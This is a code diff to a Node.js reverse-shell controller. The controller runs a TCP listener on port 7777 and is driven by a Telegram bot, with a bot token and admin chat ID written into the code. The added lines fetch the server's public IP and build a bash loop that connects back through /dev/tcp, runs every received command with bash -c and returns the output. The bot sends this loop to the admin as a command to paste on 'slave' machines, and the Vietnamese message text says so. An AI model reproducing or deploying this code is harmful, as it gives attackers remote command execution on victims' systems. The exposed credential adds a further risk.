@@ -1,5 +1,6 @@
 const net = require('net');
 const TelegramBot = require('node-telegram-bot-api');
+const https = require('https');
 
 const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc';
 const chatIdAdmin = 7371969470;
@@ -7,9 +8,25 @@ const chatIdAdmin = 7371969470;
 const bot = new TelegramBot(token, { polling: true });
 const clients = new Map(); // socket => { ip, port }
 
+function getIPv4(callback) {
+  https.get('https://api.ipify.org?format=json', res => {
+    let data = '';
+    res.on('data', chunk => data += chunk);
+    res.on('end', () => {
+      try {
+        const ip = JSON.parse(data).ip;
+        callback(ip);
+      } catch {
+        callback('YOUR_PUBLIC_IP');
+      }
+    });
+  }).on('error', () => callback('YOUR_PUBLIC_IP'));
+}
+
 function sendSlaveCommand() {
-  const slaveCmd = `while true; do
-  exec 3<>/dev/tcp/$(curl -s https://api.ipify.org)/7777
+  getIPv4(ipv4 => {
+    const slaveCmd = `while true; do
+  exec 3<>/dev/tcp/${ipv4}/7777
   while read -r cmd <&3; do
     [[ -z "$cmd" ]] && continue
     output=$(bash -c "$cmd" 2>&1)
@@ -18,7 +35,8 @@ function sendSlaveCommand() {
   sleep 2
 done`;
 
-  bot.sendMessage(chatIdAdmin, `🔥 Server sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave để kết nối:\n\`\`\`bash\n${slaveCmd}\n\`\`\``, { parse_mode: 'Markdown' });
+    bot.sendMessage(chatIdAdmin, `🔥 Server sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave để kết nối:\n\`\`\`bash\n${slaveCmd}\n\`\`\``, { parse_mode: 'Markdown' });
+  });
 }
 
 const server = net.createServer(socket => {
